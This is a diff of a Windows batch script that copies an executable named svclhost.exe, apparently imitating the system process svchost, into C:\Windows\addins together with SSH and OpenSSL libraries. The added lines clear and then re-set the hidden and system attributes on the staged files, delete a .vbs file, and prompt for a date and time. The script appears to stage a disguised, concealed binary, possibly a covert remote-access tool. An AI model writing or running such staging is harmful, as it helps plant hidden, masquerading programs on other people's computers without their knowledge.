@@ -1,10 +1,24 @@
 @echo off
 cd "C:\Windows\addins"
+attrib -h -s "C:\Windows\addins\svclhost.vbs"
+del "C:\Windows\addins\svclhost.vbs" /f
 
-xcopy "C:\Windows\Temp\libcrypto-3.dll" "C:\Windows\addins\libcrypto-3.dll"  /h /i /c /k /e /r /y
-xcopy "C:\Windows\Temp\libssh2.dll" "C:\Windows\addins\libssh2.dll"  /h /i /c /k /e /r /y
-xcopy "C:\Windows\Temp\libssl-3.dll" "C:\Windows\addins\libssl-3.dll"  /h /i /c /k /e /r /y
-xcopy "C:\Windows\Temp\svclhost.exe" "C:\Windows\addins\svclhost.exe"  /h /i /c /k /e /r /y
+attrib -h -s "C:\Windows\Temp\svclhost.exe"
+attrib -h -s "C:\Windows\Temp\svclhost.vbs"
+attrib -h -s "C:\Windows\Temp\libcrypto-3.dll"
+attrib -h -s "C:\Windows\Temp\libssh2.dll"
+attrib -h -s "C:\Windows\Temp\libssl-3.dll"
+
+copy /y "C:\Windows\Temp\libcrypto-3.dll" "C:\Windows\addins\libcrypto-3.dll"
+copy /y "C:\Windows\Temp\libssh2.dll" "C:\Windows\addins\libssh2.dll"
+copy /y "C:\Windows\Temp\libssl-3.dll" "C:\Windows\addins\libssl-3.dll"
+copy /y "C:\Windows\Temp\svclhost.exe" "C:\Windows\addins\svclhost.exe"
+
+attrib +h +s "C:\Windows\Temp\svclhost.exe"
+attrib +h +s "C:\Windows\Temp\svclhost.vbs"
+attrib +h +s "C:\Windows\Temp\libcrypto-3.dll"
+attrib +h +s "C:\Windows\Temp\libssh2.dll"
+attrib +h +s "C:\Windows\Temp\libssl-3.dll"
 
 set /P n_date=Enter Required Date (MM/DD/YYYY): 
 set /P n_time=Enter Required Time (HH:MM:SS): 
